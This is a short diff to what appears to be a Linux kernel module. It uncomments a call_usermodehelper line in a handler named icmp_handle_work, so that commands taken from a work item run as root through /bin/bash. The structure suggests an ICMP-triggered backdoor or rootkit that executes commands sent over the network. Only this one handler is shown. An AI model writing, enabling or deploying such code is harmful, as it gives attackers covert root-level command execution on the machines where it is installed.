@@ -69,7 +69,7 @@ static void icmp_handle_work(struct work_struct *work) {
 
     char *argv[] = { "/bin/bash", "-c", work_item->command, NULL };
     char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
-    // ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     #ifdef DEBUG_K
     if (ret != 0){
         pr_err("Error (%d) executing command: \"%s\"\n", ret, work_item->command);
